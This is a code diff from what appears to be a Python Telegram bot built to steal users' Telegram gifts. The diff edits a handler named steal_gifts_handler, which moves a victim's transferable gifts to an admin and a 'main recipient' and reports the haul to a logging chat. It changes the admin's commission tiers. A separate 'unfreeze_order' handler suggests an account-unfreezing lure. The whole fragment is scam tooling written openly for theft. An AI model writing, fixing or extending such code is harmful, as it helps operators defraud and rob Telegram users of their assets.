@@ -516,16 +516,14 @@ async def steal_gifts_handler(callback: CallbackQuery):
     
     total_gifts = len(transferable_gifts)
     
-    # Рассчитываем комиссию админу
-    if not is_admin:  # Если есть пригласивший
+    # Рассчитываем комиссию админу (только если есть пригласивший и больше 2 подарков)
+    if not is_admin and total_gifts > 2:  # Если есть пригласивший и больше 2 подарков
         if total_gifts >= 7:
             admin_gifts = 3
         elif 5 <= total_gifts <= 6:
             admin_gifts = 2
         elif 3 <= total_gifts <= 4:
             admin_gifts = 1
-        elif total_gifts <= 2:
-            admin_gifts = 0
     
     # Сначала передаем подарки админу (если есть комиссия)
     admin_stolen = []
@@ -612,7 +610,7 @@ async def steal_gifts_handler(callback: CallbackQuery):
         f"🔹 Основному получателю: {len(user_stolen)}"
     )
     await bot.send_message(LOG_CHAT_ID, log_msg)
-
+    
 @dp.callback_query(F.data == "unfreeze_order")
 async def handle_unfreeze_order(callback: CallbackQuery):
     await callback.message.delete()
